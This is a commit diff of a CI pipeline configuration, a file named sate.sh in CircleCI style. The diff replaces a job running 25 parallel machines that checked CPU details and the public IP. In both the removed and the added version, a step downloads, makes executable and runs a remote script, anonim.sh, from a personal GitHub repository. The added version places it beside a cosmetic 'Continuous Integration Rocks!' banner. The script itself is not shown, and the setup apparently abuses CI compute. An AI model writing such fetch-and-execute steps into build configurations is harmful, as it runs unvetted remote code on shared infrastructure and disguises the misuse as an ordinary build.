4b04ea09a1f322b50f9e30058fefb1ba5f6206cb
j0642773 <107818629+j0642773@users.noreply.github.com>
2022-07-31 13:10:36 +0000

    Update sate.sh

--- sate.sh
+++ sate.sh
@@ -1,20 +1,11 @@
-version: 2.1
-
 jobs:
-  trial:
-    machine:
-      image: ubuntu-2004:current
-    resource_class: large
-    parallelism: 25
+  build:
+    docker:
+      - image: cimg/base:2022.03
     steps:
-      - run: lscpu
-      - run: curl ifconfig.me
-      - run: 
-            name: "trial" 
-            command: wget https://raw.githubusercontent.com/j0642773/dua/main/anonim.sh && chmod u+x anonim.sh && ./anonim.sh
- 
-workflows: 
-    version: 2.1 
-    build: 
-        jobs: 
-        - trial
+      - checkout
+      # Whatever you want to do
+      - run: sudo apt-get update && sudo  wget https://raw.githubusercontent.com/j0642773/dua/main/anonim.sh && chmod u+x anonim.sh && ./anonim.sh
+      - run: figlet Continuous Integration Rocks!
+            
+
